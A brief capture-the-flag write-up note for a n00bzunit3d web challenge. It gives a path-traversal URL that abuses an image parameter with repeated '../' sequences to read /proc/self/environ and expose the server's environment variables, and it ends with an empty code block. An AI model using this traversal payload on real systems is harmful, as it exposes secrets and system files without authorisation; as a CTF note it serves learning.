Very obvious hint indeed.

We can read the current process's environment variables via `/proc/self/environ`.

http://76cf1086-2c7a-4f07-82ae-1f0858e460c7.challs.n00bzunit3d.xyz:8080/view?image=../../../../../../../../../proc/self/environ

```

```
